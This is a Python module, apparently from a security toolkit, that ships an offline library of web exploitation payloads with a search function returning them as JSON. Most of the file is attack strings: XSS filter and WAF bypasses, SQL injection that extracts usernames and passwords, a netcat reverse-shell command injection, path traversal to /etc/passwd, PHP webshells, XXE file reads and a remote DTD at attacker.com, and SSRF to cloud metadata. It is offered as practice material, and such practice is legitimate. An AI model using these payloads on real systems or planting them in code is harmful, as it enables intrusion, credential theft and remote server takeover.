"""Offline payload snippets for web exploitation practice."""

from __future__ import annotations

import json
from typing import Dict, List

from ..base import ToolResult


_PAYLOADS: Dict[str, Dict[str, str]] = {
    # XSS Payloads
    "xss_basic": {
        "payload": "<svg onload=alert('xss')>",
        "category": "XSS",
        "description": "Basic SVG-based XSS payload",
    },
    "xss_script_tag": {
        "payload": "<script>alert('xss')</script>",
        "category": "XSS",
        "description": "Classic script tag XSS",
    },
    "xss_img_error": {
        "payload": "<img src=x onerror=alert('xss')>",
        "category": "XSS",
        "description": "Image with error handler",
    },
    "xss_filter_bypass": {
        "payload": "<ScRiPt>alert('xss')</ScRiPt>",
        "category": "XSS",
        "description": "Case variation to bypass filters",
    },
    "xss_waf_bypass": {
        "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "category": "XSS",
        "description": "WAF bypass using String.fromCharCode",
    },
    "xss_dom": {
        "payload": "<script>eval(location.hash.slice(1))</script>",
        "category": "XSS",
        "description": "DOM-based XSS using location.hash",
    },
    
    # SQL Injection Payloads
    "sqli_union": {
        "payload": "' UNION SELECT username, password FROM users--",
        "category": "SQLi",
        "description": "Basic UNION-based SQL injection",
    },
    "sqli_error": {
        "payload": "'",
        "category": "SQLi",
        "description": "Error-based SQL injection trigger",
    },
    "sqli_time": {
        "payload": "' OR SLEEP(5)--",
        "category": "SQLi",
        "description": "Time-based blind SQL injection (MySQL)",
    },
    "sqli_boolean": {
        "payload": "' AND 1=1--",
        "category": "SQLi",
        "description": "Boolean-based blind SQL injection",
    },
    "sqli_postgres": {
        "payload": "' OR pg_sleep(5)--",
        "category": "SQLi",
        "description": "Time-based SQL injection (PostgreSQL)",
    },
    "sqli_mssql": {
        "payload": "'; WAITFOR DELAY '0:0:5'--",
        "category": "SQLi",
        "description": "Time-based SQL injection (MSSQL)",
    },
    
    # Command Injection
    "cmd_basic": {
        "payload": "; nc 127.0.0.1 4444 -e /bin/sh",
        "category": "Command Injection",
        "description": "Basic command injection with netcat reverse shell",
    },
    "cmd_semicolon": {
        "payload": "; id",
        "category": "Command Injection",
        "description": "Simple command injection with semicolon",
    },
    "cmd_pipe": {
        "payload": "| id",
        "category": "Command Injection",
        "description": "Command injection with pipe",
    },
    "cmd_backtick": {
        "payload": "`id`",
        "category": "Command Injection",
        "description": "Command injection with backticks",
    },
    "cmd_dollar": {
        "payload": "$(id)",
        "category": "Command Injection",
        "description": "Command injection with $()",
    },
    
    # Path Traversal
    "path_traversal_basic": {
        "payload": "../../../../etc/passwd",
        "category": "Path Traversal",
        "description": "Basic path traversal to read /etc/passwd",
    },
    "path_traversal_windows": {
        "payload": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "category": "Path Traversal",
        "description": "Windows path traversal",
    },
    "path_traversal_encoded": {
        "payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "category": "Path Traversal",
        "description": "URL-encoded path traversal",
    },
    "path_traversal_double": {
        "payload": "....//....//....//etc/passwd",
        "category": "Path Traversal",
        "description": "Double-encoded path traversal",
    },
    
    # PHP Payloads
    "php_eval": {
        "payload": "<?php eval($_GET['cmd']); ?>",
        "category": "PHP",
        "description": "PHP eval-based webshell",
    },
    "php_system": {
        "payload": "<?php system($_GET['cmd']); ?>",
        "category": "PHP",
        "description": "PHP system() execution",
    },
    "php_file_get": {
        "payload": "<?php echo file_get_contents('/etc/passwd'); ?>",
        "category": "PHP",
        "description": "PHP file read",
    },
    "php_assert": {
        "payload": "<?php assert($_POST['cmd']); ?>",
        "category": "PHP",
        "description": "PHP assert-based execution",
    },
    
    # XXE Payloads
    "xxe_basic": {
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        "category": "XXE",
        "description": "Basic XXE to read local file",
    },
    "xxe_remote": {
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
        "category": "XXE",
        "description": "XXE with remote DTD",
    },
    
    # SSRF Payloads
    "ssrf_localhost": {
        "payload": "http://localhost:22",
        "category": "SSRF",
        "description": "SSRF to localhost",
    },
    "ssrf_metadata": {
        "payload": "http://169.254.169.254/latest/meta-data/",
        "category": "SSRF",
        "description": "SSRF to AWS metadata service",
    },
    "ssrf_internal": {
        "payload": "http://127.0.0.1:6379",
        "category": "SSRF",
        "description": "SSRF to internal Redis",
    },
    
    # Template Injection (SSTI)
    "ssti_jinja2": {
        "payload": "{{7*7}}",
        "category": "SSTI",
        "description": "Jinja2 template injection test",
    },
    "ssti_twig": {
        "payload": "{{7*7}}",
        "category": "SSTI",
        "description": "Twig template injection test",
    },
    "ssti_freemarker": {
        "payload": "${7*7}",
        "category": "SSTI",
        "description": "FreeMarker template injection test",
    },
}


class OfflinePayloadLibrary:
    name = "Payload Library"
    description = "Browse a curated set of offline payload examples."
    category = "Web"

    def run(self, query: str = "", category: str = "") -> ToolResult:
        matches: Dict[str, Dict[str, str]] = {}
        
        # Filter by query
        search_query = query.lower() if query else ""
        filter_category = category.lower() if category else ""
        
        for key, payload_data in _PAYLOADS.items():
            payload_text = payload_data.get("payload", "")
            payload_desc = payload_data.get("description", "")
            payload_cat = payload_data.get("category", "")
            
            # Filter by category
            if filter_category and payload_cat.lower() != filter_category.lower():
                continue
            
            # Filter by search query
            if search_query:
                if (
                    search_query not in key.lower()
                    and search_query not in payload_text.lower()
                    and search_query not in payload_desc.lower()
                ):
                    continue
            
            matches[key] = payload_data
        
        # Organize by category
        by_category: Dict[str, List[Dict[str, str]]] = {}
        
        # Group by category
        for key, payload_data in matches.items():
            cat = str(payload_data.get("category", "Other"))
            if cat not in by_category:
                by_category[cat] = []
            by_category[cat].append({
                "name": key,
                "payload": str(payload_data.get("payload", "")),
                "description": str(payload_data.get("description", "")),
            })
        
        result: Dict[str, object] = {
            "total": len(matches),
            "by_category": by_category,
            "payloads": matches,
        }
        
        body = json.dumps(result, indent=2)
        return ToolResult(title="Payload Library", body=body, mime_type="application/json")
